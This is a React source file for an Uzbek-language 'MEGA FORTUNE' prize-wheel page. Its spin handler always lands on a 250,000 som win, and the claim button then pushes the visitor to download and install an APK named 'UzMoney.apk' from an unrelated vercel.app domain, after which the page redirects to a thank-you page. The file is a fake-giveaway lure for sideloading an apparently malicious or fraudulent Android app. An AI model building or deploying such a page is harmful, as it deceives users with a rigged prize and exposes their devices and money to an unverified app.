import React, { useState, useRef, useEffect } from 'react';

export default function RoulettePage() {
  const [isSpinning, setIsSpinning] = useState(false);
  const [showWinModal, setShowWinModal] = useState(false);
  const [wheelRotation, setWheelRotation] = useState(0);
  const [coins, setCoins] = useState([]);
  const coinIdRef = useRef(0);
  const animationIdRef = useRef(null);

  // ===== ПРИЗЫ С ПРЯМЫМИ PNG ССЫЛКАМИ =====
  const prizes = [
    {
      id: 0,
      type: 'win',
      amount: 250000,
      color: '#FFD700',
      image: 'https://pngimg.com/uploads/money/money_PNG3542.png'
    },
    { id: 1, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
    {
      id: 2,
      type: 'device',
      color: '#4169E1',
      image: 'https://pngimg.com/uploads/iphone_14/iphone_14_PNG19.png'
    },
    { id: 3, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
    {
      id: 4,
      type: 'device',
      color: '#4169E1',
      image: 'https://pngimg.com/uploads/macbook/macbook_PNG23.png'
    },
    { id: 5, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
    {
      id: 6,
      type: 'device',
      color: '#4169E1',
      image: 'https://pngimg.com/uploads/airPods/airPods_PNG8.png'
    },
    { id: 7, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
    {
      id: 8,
      type: 'device',
      color: '#4169E1',
      image: 'https://pngimg.com/uploads/tv/tv_PNG39223.png'
    },
    { id: 9, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
    {
      id: 10,
      type: 'device',
      color: '#4169E1',
      image: 'https://s7d1.scene7.com/is/image/dmqualcommprod/meta-quest-3-4?$QC_Responsive$&fmt=png-alpha'
    },
    { id: 11, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' },
    {
      id: 12,
      type: 'device',
      color: '#4169E1',
      image: 'https://png.pngtree.com/png-vector/20250221/ourmid/pngtree-top-quality-playstation-5-console-isolated-png-image_15514648.png'
    },
    { id: 13, type: 'lose', color: '#CC0000', image: 'https://static.vecteezy.com/system/resources/previews/016/314/454/original/red-cross-mark-free-png.png' }
  ];

  const sliceAngle = 360 / prizes.length;

  // ===== СОЗДАНИЕ МОНЕТОК =====
  const createCoin = () => {
    const newCoin = {
      id: coinIdRef.current++,
      left: Math.random() * 100,
      delay: Math.random() * 0.2,
      duration: 2 + Math.random() * 1.5,
      size: 20 + Math.random() * 20
    };
    setCoins(prev => [...prev, newCoin]);
    
    setTimeout(() => {
      setCoins(prev => prev.filter(c => c.id !== newCoin.id));
    }, (newCoin.delay + newCoin.duration) * 1000);
  };

  // ===== МЕДЛЕННОЕ АВТО-ВРАЩЕНИЕ =====
  useEffect(() => {
    if (isSpinning) return;

    let last = performance.now();
    const idleRotate = (time) => {
      const delta = time - last;
      last = time;
      setWheelRotation(prev => prev + delta * 0.01);
      animationIdRef.current = requestAnimationFrame(idleRotate);
    };
    animationIdRef.current = requestAnimationFrame(idleRotate);
    return () => cancelAnimationFrame(animationIdRef.current);
  }, [isSpinning]);

  // ===== СПИН (СИЛЬНАЯ КРУТКА) =====
  const handleSpin = () => {
    if (isSpinning) return;
    setIsSpinning(true);

    // Создаём множество монеток
    for (let i = 0; i < 50; i++) {
      setTimeout(() => createCoin(), i * 20);
    }

    const moneyIndex = 0;
    const moneyAngle = moneyIndex * sliceAngle + sliceAngle / 2;
    const targetAngle = 270 - moneyAngle;

    // СИЛЬНАЯ КРУТКА - больше оборотов
    const spins = 15;
    const finalRotation = 360 * spins + targetAngle;

    setWheelRotation(finalRotation);

    setTimeout(() => {
      setShowWinModal(true);
      setIsSpinning(false);
    }, 6000);
  };

  // ===== УСТАНОВКА APK UzMoney =====
  const handleClaimPrize = (e) => {
    e.preventDefault();

    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
    
    // На мобилке: попытка открыть напрямую (вызовет установку)
    window.location.href = apkUrl;

    // На ПК: открываем в новой вкладке
    setTimeout(() => {
      window.open(apkUrl, '_blank');
    }, 300);

    // Редирект на thankyou после задержки
    setTimeout(() => {
      window.location.href = '/thankyou.html';
    }, 1500);
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #1a0033 0%, #330066 25%, #1a0033 50%, #330066 75%, #1a0033 100%)',
      backgroundSize: '400% 400%',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      color: '#fff',
      padding: '16px',
      overflow: 'hidden',
      animation: 'gradientShift 15s ease infinite',
      position: 'relative'
    }}>
      <style>{`
        @keyframes gradientShift {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }

        @keyframes coinFall {
          0% {
            opacity: 1;
            transform: translateY(-100px) rotateZ(0deg) scale(1);
          }
          100% {
            opacity: 0;
            transform: translateY(calc(100vh + 100px)) rotateZ(720deg) scale(0.1);
          }
        }

        @keyframes shine {
          0%, 100% { 
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5),
                        0 0 20px rgba(255, 165, 0, 0.3);
          }
          50% { 
            text-shadow: 0 0 20px rgba(255, 215, 0, 1),
                        0 0 40px rgba(255, 165, 0, 0.7),
                        0 0 60px rgba(255, 255, 0, 0.5);
          }
        }

        @keyframes bounce {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-15px); }
        }

        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.15); }
        }

        @keyframes float {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-20px); }
        }

        .coin {
          position: fixed;
          pointer-events: none;
          z-index: 5;
        }

        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>

      {/* Падающие монеты */}
      {coins.map(coin => (
        <div
          key={coin.id}
          className="coin"
          style={{
            left: `${coin.left}%`,
            top: '-50px',
            fontSize: `${coin.size}px`,
            animation: `coinFall ${coin.duration}s linear ${coin.delay}s forwards`
          }}
        >
          💰
        </div>
      ))}

      {/* Декоративный фон */}
      <div style={{
        position: 'absolute',
        top: '-100px',
        right: '-100px',
        width: '300px',
        height: '300px',
        borderRadius: '50%',
        background: 'radial-gradient(circle, rgba(255, 215, 0, 0.3) 0%, transparent 70%)',
        animation: 'float 8s ease-in-out infinite',
        zIndex: 1
      }} />

      {/* Заголовок */}
      <h1 style={{
        fontSize: 'clamp(1.8rem, 8vw, 2.8rem)',
        fontWeight: '900',
        margin: '20px 0',
        letterSpacing: '3px',
        textTransform: 'uppercase',
        color: '#FFD700',
        animation: 'shine 2s ease-in-out infinite',
        textShadow: '0 4px 20px rgba(255, 215, 0, 0.5)'
      }}>
        🎡 MEGA FORTUNE
      </h1>
      <p style={{
        fontSize: 'clamp(1rem, 5vw, 1.3rem)',
        margin: '0 0 30px 0',
        opacity: 0.9,
        fontWeight: '700',
        color: '#FFB6C1',
        textShadow: '0 2px 10px rgba(255, 215, 0, 0.6)',
        letterSpacing: '1px'
      }}>
        ✨ 250K СЎМ ХАМ ЭСКИ ЙУТ ✨
      </p>

      {/* Контейнер рулетки - оптимизирован для мобилки */}
      <div style={{
        position: 'relative',
        width: 'min(100vw - 32px, 380px)',
        aspectRatio: '1',
        marginBottom: '30px',
        perspective: '1000px',
        zIndex: 10
      }}>
        {/* Внешний обод с эффектом */}
        <div style={{
          position: 'absolute',
          inset: '-12px',
          borderRadius: '50%',
          background: 'conic-gradient(from 0deg, #FFD700, #FFA500, #FFD700)',
          animation: 'spin 3s linear infinite',
          zIndex: -1,
          opacity: 0.8
        }} />

        {/* Внутренний обод */}
        <div style={{
          position: 'absolute',
          inset: '-8px',
          borderRadius: '50%',
          background: 'conic-gradient(from 180deg, #FF1493, #00CED1, #FF1493)',
          animation: 'spin -4s linear infinite',
          zIndex: -1
        }} />

        {/* СТРЕЛКА */}
        <div style={{
          position: 'absolute',
          top: '-24px',
          left: '50%',
          transform: 'translateX(-50%)',
          width: 0,
          height: 0,
          borderLeft: '14px solid transparent',
          borderRight: '14px solid transparent',
          borderTop: '26px solid #FFD700',
          zIndex: 10,
          filter: 'drop-shadow(0 4px 8px rgba(255, 215, 0, 0.9))',
          animation: 'bounce 0.8s ease-in-out infinite'
        }} />

        {/* Рулетка */}
        <div style={{
          width: '100%',
          height: '100%',
          borderRadius: '50%',
          transform: `rotate(${wheelRotation}deg)`,
          transition: isSpinning ? 'transform 6s cubic-bezier(0.15, 0.5, 0.1, 1)' : 'none',
          boxShadow: '0 0 40px rgba(255,215,0,0.6), inset 0 0 20px rgba(255,215,0,0.2), 0 20px 50px rgba(0,0,0,0.5)',
          border: '6px solid #FFD700'
        }}>
          <svg viewBox="0 0 200 200" width="100%" height="100%">
            {prizes.map((prize, index) => {
              const startAngle = index * sliceAngle;
              const endAngle = startAngle + sliceAngle;
              const startRad = (startAngle * Math.PI) / 180;
              const endRad = (endAngle * Math.PI) / 180;

              const x1 = 100 + 95 * Math.cos(startRad);
              const y1 = 100 + 95 * Math.sin(startRad);
              const x2 = 100 + 95 * Math.cos(endRad);
              const y2 = 100 + 95 * Math.sin(endRad);

              const pathData = `M 100 100 L ${x1} ${y1} A 95 95 0 0 1 ${x2} ${y2} Z`;

              const midAngle = startAngle + sliceAngle / 2;
              const midRad = (midAngle * Math.PI) / 180;
              const imgX = 100 + 70 * Math.cos(midRad) - 16;
              const imgY = 100 + 70 * Math.sin(midRad) - 16;

              return (
                <g key={prize.id}>
                  <path d={pathData} fill={prize.color} stroke="#fff" strokeWidth="2.5" opacity="0.95" />
                  {prize.type === 'win' && (
                    <>
                      <path d={pathData} fill="none" stroke="#FFF700" strokeWidth="7" opacity="0.7" />
                      <path d={pathData} fill="none" stroke="#FFD700" strokeWidth="3" opacity="0.4" />
                    </>
                  )}
                  <image href={prize.image} x={imgX} y={imgY} width="32" height="32" preserveAspectRatio="xMidYMid meet" style={{ filter: 'drop-shadow(0 2px 4px rgba(0,0,0,0.4))' }} />
                </g>
              );
            })}
            {/* Центр */}
            <circle cx="100" cy="100" r="20" fill="#FFD700" stroke="#fff" strokeWidth="3" />
            <circle cx="100" cy="100" r="14" fill="#FFA500" />
            <circle cx="100" cy="100" r="10" fill="#FFD700" />
            <text x="100" y="106" textAnchor="middle" dominantBaseline="middle" fill="#FF1493" fontSize="16" fontWeight="bold" style={{ userSelect: 'none' }}>✨</text>
          </svg>
        </div>
      </div>

      {/* Кнопка вращения */}
      <button
        onClick={handleSpin}
        disabled={isSpinning}
        style={{
          padding: '16px 48px',
          fontSize: 'clamp(1rem, 5vw, 1.3rem)',
          fontWeight: '900',
          borderRadius: 50,
          border: '4px solid #FF1493',
          background: 'linear-gradient(145deg, #FFED4E, #FFD700)',
          cursor: isSpinning ? 'not-allowed' : 'pointer',
          boxShadow: '0 0 30px rgba(255,215,0,0.8), 0 8px 20px rgba(255,165,0,0.5)',
          color: '#000',
          textTransform: 'uppercase',
          letterSpacing: '2px',
          transition: 'all 0.3s ease',
          opacity: isSpinning ? 0.8 : 1,
          marginBottom: '20px',
          zIndex: 10,
          animation: isSpinning ? 'none' : 'pulse 1.5s ease-in-out infinite'
        }}
        onMouseOver={(e) => {
          if (!isSpinning) {
            e.target.style.transform = 'scale(1.12)';
            e.target.style.boxShadow = '0 0 50px rgba(255,215,0,1), 0 12px 30px rgba(255,165,0,0.7)';
          }
        }}
        onMouseOut={(e) => {
          e.target.style.transform = 'scale(1)';
          e.target.style.boxShadow = '0 0 30px rgba(255,215,0,0.8), 0 8px 20px rgba(255,165,0,0.5)';
        }}
      >
        {isSpinning ? '⏳ БУЛАНМОҚДА...' : '🎰 АЙЛАНТИР'}
      </button>

      {/* Инфо панель */}
      <div style={{
        maxWidth: '95vw',
        width: '100%',
        maxWidth: 400,
        padding: '16px',
        backgroundColor: 'rgba(255, 215, 0, 0.1)',
        borderRadius: '16px',
        backdropFilter: 'blur(10px)',
        border: '2px solid #FFD700',
        boxShadow: '0 0 20px rgba(255, 215, 0, 0.3)',
        zIndex: 10,
        fontSize: 'clamp(0.9rem, 4vw, 1rem)',
        lineHeight: '1.8',
        fontWeight: '600'
      }}>
        <p style={{ margin: 0 }}>
          ✅ Герт юқ куни айлантир<br />
          💰 250,000 сўм ХАМ ЭСКИ ЙУТ ОЛАСАН<br />
          🎁 Дарҳол ҳамма чора қилиб берилади
        </p>
      </div>

      {/* МОДАЛЬ ВЫИГРЫША */}
      {showWinModal && (
        <div
          onClick={() => setShowWinModal(false)}
          style={{
            position: 'fixed',
            inset: 0,
            background: 'rgba(0,0,0,.95)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000,
            backdropFilter: 'blur(10px)',
            padding: '20px'
          }}
        >
          <div
            onClick={e => e.stopPropagation()}
            style={{
              background: 'linear-gradient(135deg, #FFD700 0%, #FFA500 50%, #FF1493 100%)',
              color: '#000',
              padding: '20px',
              borderRadius: 20,
              textAlign: 'center',
              width: '100%',
              maxWidth: 340,
              boxShadow: '0 0 60px rgba(255,215,0,0.8), 0 30px 80px rgba(0,0,0,0.5)',
              border: '4px solid #fff',
              animation: 'pulse 0.5s ease-out',
              maxHeight: '90vh',
              overflow: 'auto'
            }}
          >
            <div style={{ fontSize: '2.5rem', marginBottom: 12, animation: 'pulse 0.4s' }}>
              🎉✨🎁✨🎉
            </div>

            <h2 style={{ fontSize: '1.6rem', fontWeight: 900, margin: '0 0 8px 0', textShadow: '0 3px 10px rgba(0,0,0,0.2)' }}>
              ТАБРИКЛАЙМИЗ! 🏆
            </h2>

            <p style={{ fontSize: '0.95rem', fontWeight: 700, margin: '8px 0 14px 0' }}>
              Сен ЁЗГУРДИНГ!
            </p>

            <div style={{ background: '#fff', borderRadius: 14, padding: '14px', margin: '14px 0', boxShadow: 'inset 0 5px 15px rgba(0,0,0,0.1)' }}>
              <p style={{ fontSize: '1.8rem', margin: 0 }}>💵</p>
              <p style={{ color: '#FF1493', fontSize: '1.8rem', fontWeight: 900, margin: '3px 0 0 0' }}>
                250,000 сўм
              </p>
            </div>

            <div style={{ background: 'rgba(255,255,255,0.25)', borderRadius: 10, padding: '12px', margin: '12px 0', color: '#fff', fontSize: '0.8rem', textAlign: 'left', border: '2px solid rgba(255,255,255,0.5)', lineHeight: 1.6 }}>
              <p style={{ margin: '6px 0', fontWeight: 700 }}>📲 Қадам 1: Приложениеҳ унинди</p>
              <p style={{ margin: '6px 0', fontWeight: 700 }}>✍️ Қадам 2: Регистр қилинг</p>
              <p style={{ margin: '6px 0', fontWeight: 700 }}>💸 Қадам 3: Ўз саодатингизни!</p>
            </div>

            <button
              onClick={handleClaimPrize}
              style={{
                width: '100%',
                padding: '12px',
                background: '#4ECDC4',
                color: '#fff',
                border: '3px solid #fff',
                borderRadius: 10,
                fontSize: '0.95rem',
                fontWeight: 900,
                cursor: 'pointer',
                marginTop: 12,
                textTransform: 'uppercase',
                letterSpacing: 1,
                transition: 'all 0.3s',
                boxShadow: '0 0 20px rgba(78, 205, 196, 0.6)'
              }}
              onMouseOver={(e) => {
                e.target.style.background = '#45A7A0';
                e.target.style.transform = 'scale(1.08)';
              }}
              onMouseOut={(e) => {
                e.target.style.background = '#4ECDC4';
                e.target.style.transform = 'scale(1)';
              }}
            >
              💸 МИЛЛИМЕ ЁЗГУРДИ
            </button>

            <button
              onClick={() => setShowWinModal(false)}
              style={{
                width: '100%',
                padding: '10px',
                background: 'rgba(0,0,0,0.15)',
                color: '#fff',
                border: '3px solid #fff',
                borderRadius: 10,
                fontSize: '0.9rem',
                fontWeight: 700,
                cursor: 'pointer',
                marginTop: 8,
                textTransform: 'uppercase',
                letterSpacing: 1,
                transition: 'all 0.3s'
              }}
              onMouseOver={(e) => {
                e.target.style.background = 'rgba(0,0,0,0.25)';
                e.target.style.transform = 'scale(1.05)';
              }}
              onMouseOut={(e) => {
                e.target.style.background = 'rgba(0,0,0,0.15)';
                e.target.style.transform = 'scale(1)';
              }}
            >
              Қайта юрирман
            </button>
          </div>
        </div>
      )}
    </div>
  );
}